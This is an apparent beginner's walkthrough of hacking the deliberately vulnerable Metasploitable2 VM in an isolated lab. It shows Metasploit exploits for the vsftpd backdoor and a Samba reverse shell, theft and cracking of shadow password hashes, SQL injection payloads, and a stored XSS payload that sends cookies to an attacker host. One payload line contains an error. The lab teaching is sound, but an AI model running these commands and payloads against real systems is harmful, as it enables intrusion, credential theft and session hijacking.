# Hacking Metaspoitable

This is my walk down on how I hacked Metaspoitable2 and how fixed all the issues I ran into, this was my introduction project based upon what I had learned from Network+ and Security+ courses. Brief reference: Metaspoitable2 is an on-purpose vulnerable library which allows you to exploit different vulnerabilities. A legal way to learn offensive techniques. Let's go through the whole process. 

## Step 1 - Setting up VMs

For our home lab we need a hypervisor, an attacker VM, a target VM and an isolated network.

**Hypervisor** - is a software that enables multiple VMs run simultaneously. For out purposes we will use the most common VirtualBox. 

**Attacker VM - Kali Linux** - download the prebuilt VirtualBox image from kali.org/get-kali. It comes with Metasploit, nmap, Burp Suite, and basically every tool you'll need preinstalled. Default creds are ```kali/kali```.

**Target VM - Metaspoitable2** - download it from SourceForge(```sourceforge.net/projects/metasploitable/```). It's a Ubuntu 8.04 image, later we will run into some issues assosiated with that legacy version. Default creds are ```msfadmin/msfadmin```. Metasploitable 3 exists and is more modern, but 2 is the right starting point — it's simpler, every vulnerability is well-documented, and you'll find a thousand walkthroughs online when you get stuck. 

#### Important thing to consider:

**The network must be isolated**.  Metasploitable is so vulnerable that exposing it to your home LAN is genuinely dangerous — anyone on your network (or worse, the internet if you've port-forwarded anything) could pop it. In VirtualBox, set both VMs to Host-only Adapter or Internal Network. They'll be able to talk to each other but nothing outside. Confirm this by trying to ping 8.8.8.8 from Metasploitable — it should fail.

Next you should add VM images to VirtualBox: 
- Create Metaspoitable and Kali VMs from images you have downloaded previously. 
- Configure settings fro each VM(CPU, RAM, Name, Video Memory). 
- Set up an **isolated network**. You **cannot skip** this step(unless you want your machine to become vulnerable). 
    - In VirtualBox go to ```File -> Tools -> Network```. 
    - Create new Network Adapter, on Windows it will defaultly be named as ```VirtualBox Host-Only Ethernet Adapter```, on Linux/macOS ```vboxnet0```.
    - Enable DHCP server for newly created adapter. 
    - Configure this newly created adapter to each one of the VMs. Make sure they match. 

From there start each VM, authenticate(msfadmin, kali) and check for ```eth0``` running ```ifconfig``` for Metaspoitable and ```ip a``` for Kali. You should see something like ```192.168.x.x``` running these commands.  Ping one VM from another, it should be successful. 

## Step 2 - Reconnaissance

Reconnaissance referce to a process of preliminary investigating to gather information before performing an action. In our case, the logical question will pop up in an attacker's head: *what's there?*. It's crucial to know what you are attacking, before actually attacking. 

From Kali run: 
```shell
nmap -sn <target-ip>/24
```

```-sn``` means "ping scan, no port scan" — it just finds live hosts. You'll see Kali, the host, and Metasploitable.

Now port scan the target: 

```shell
nmap -sV -sC -p- <target-ip> -oN nmap_full.txt
```
Breaking that down: ```-sV``` does service/version detection (not just "port 21 is open" but "port 21 is running vsftpd 2.3.4"). ```-sC``` runs default safe scripts that probe for common issues. ```-p-``` scans all 65535 ports instead of just the top 1000. ```-oN``` saves output to a file. This will take a few minutes.

You'll see something like 20+ open ports — FTP, SSH, Telnet, SMTP, HTTP, RPC, Samba, MySQL, PostgreSQL, VNC, IRC, and more. **This is your attack surface.** Each open port is a door, each service version is a clue, each unusual service is potentially something interesting.

## Step 3 - Identifying Vulnerabilities

For each interesting service, the workflow is: get the version → look up known vulnerabilities → check if there's a public exploit.

The classic tool is ```searchsploit``` (Exploit-DB's offline database, preinstalled on Kali):

```shell 
searchsploit vsftpd 2.3.4
searchsploit samba 3.0.20
searchsploit unrealircd 3.2.8.1
```
For each one of these commands you will get different response with vulnerabilities listed. You will something like this for ```searchsploit vsftpd 2.3.4```: 

```shell
vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/17491.rb
vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py
```

This is **CVE-2011-2523**, you can google it up. This vulnerability is a backdoor that opens a shell on port 6200/tcp, allowing unauthorized access to affected systems. The backdoor script activate if you type in ```:)``` at the end of your username when authenticating, just like this: ```username:)```. I highly reccomend you to google all these vulnerabilities, because it's essential to also know why what we are trying to exploit is broken. 

Browser prompt: **CVE [service] [version]**

## Step 4 - Exploitation 

Now we will exploit each one of these vulnerabilities. We will start off with ```vsftpd```. 

### 4a - vsftpd 2.3.4 
In Kali run:
```shell 
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target-ip> (metaspoitable VM) 
set LHOST <attacker-ip> (kali VM) 
show options
exploit
```

Now we have gained access to ```meterpreter```, which basically means we now have a Unix command shell as **root.** To check that, run following commands: 
```shell
shell
whoami (The response should be root)
```

Now you can do a lot of interesting things, we will pull the passwords and crack them with John the Ripper. 

In meterpreter run: 

```shell
download /etc/passwd (pulls passwords)
download /etc/shadow (pulls hashes)
```

From another Kali terminal crack passwords

```shell
unshadow /home/kali/passwd /home/kali/shadow > /home/kali/cracked.txt
cat /home/kali/cracked.txt
```

**cracked.txt** should be something like that: 
```shell 
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
```

Run John: 

```shell
john /home/kali/cracked.txt

OR if john is slow: 

# rockyou ships compressed on Kali, decompress once:
gunzip /usr/share/wordlists/rockyou.txt.gz

# then point john at it:
john --wordlist=/usr/share/wordlists/rockyou.txt /root/cracked.txt
```

It will take some time, but now we have passwords: 
```shell
john --show /home/kali/cracked.txt
```

Next step is to connect with SSH: 
```shell
ssh msfadmin@<target-ip> // password: msfadmin 
ssh postgres@<target-ip> // password: postgres
ssh user@<target-ip> // password: user 
```

Now we have SSH for almost every running service. You may also run into an error like this when running ```ssh``` commands:
```shell
Unable to negotiate with <target-ip> on port 22: no matching host key type found.
```

It is caused because Metaspoitable2 runs on 2010 OpenSSH server and Kali is on the new one. The **fix** would be to allow old OpenSSH algorithms.

```shell
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@<target-ip>
```

### 4b - Samba 3.0.20 

Samba 3.0.20 had an option called ```username map script``` that, when configured, passed the username to a shell script. The bug: it didn't sanitize the username, so you could inject shell metacharacters and execute arbitrary commands as root before any authentication happened. This is a Command Injection. 

In Kali (msfconsole) run: 
```shell
search samba
use exploit/multi/samba/usermap_script
set RHOSTS <target-ip>
set payload cmd/unix/reverse
set LHOST <attacker-ip>
exploit
```
That gives you a reverse shell - the *target* connects back to you. This matters: if the target is behind NAT or a firewall blocking inbound, a reverse shell often works where a bind shell wouldn't.

### 4c - DVWA 

Metaspoitable hosts multiple vulnerable web apps. One of the exploitation tactics would be SQL Injection. From Kali go to http://target-ip/ and select DVWA. In ```DVWA Security``` section set Security Level to low. 

SQL Injection allows to run SQL commands from client's input. In ```SQL Injection``` section you can type in User ID and app will return you user_id, first_name, last_name. Type in 1, 2 or 3. 

Now the SQL query looks something like this:

```sql
SELECT * FROM users WHERE user_id = '$id'
```

But if you type in: 
```sql 
1' OR '1'='1
```

You will get all users. This is because with this command the final query becomes: 

```sql 
SELECT * FROM users WHERE user_id = '1' OR '1'='1'
```

To get all **password hashes** we input: 

```sql 
1' UNION SELECT user, password FROM users--
```

Crack them with ```john``` or ```hashcat```.

### Other common vulnerabilites to know and how to exploit them

Important thing to consider: there is data and code(data operations). Most of the vulnerabilities are based upon how data can affect code. So basically, *User input is data*, that allows us to modify how our web app behaves based on what we *type in.* A good example is **XSS.** 

**XSS** - Cross-Site Scripting is a common vulnerability which allows us to inject malicious code into a web app. There are couple of types of XSS. 

- **Reflected XSS** - payload comes from the URL or a form, gets echoed back into the page once. Attacker sends a victim a malicious link.
- **Stored XSS** - — payload gets saved on the server (in a comment, profile, forum post) and runs for every user who views that page. Way more dangerous — it scales.
- **DOM-based XSS** — the unsafe handling happens entirely in client-side JavaScript, no server involvement. 

In the DVWA web app go to sections ```XSS reflected``` or ```XSS stored```. Input something like:

```javascript 
<script>alert('XSS attack')</script>
```

Now revisit page, you should get an alert. 

More sophisticated attack would involve getting User's session cookies and Authentication with them. For that go to ```XSS stored```, type in ```Message``` field and click ```Sign Guestbook```: 

```javascript
<script>fetch('http://attacker-ip:8000/?c='+document.cookies)</script>
```

In Kali terminal start listening: 

```shell
python3 -m http.server -b <attacker-ip> 8000
```

Now revisit the ```XSS stored``` page, you should get cookies in Kali's terminal, that's your key to authentication. From now just logout and inject this cookie value as ```PHPSESSID``` in DevTools, navigate to Auth Required page(something like http://target-ip/dvwa/), you should be able to see it without entering credentials. 
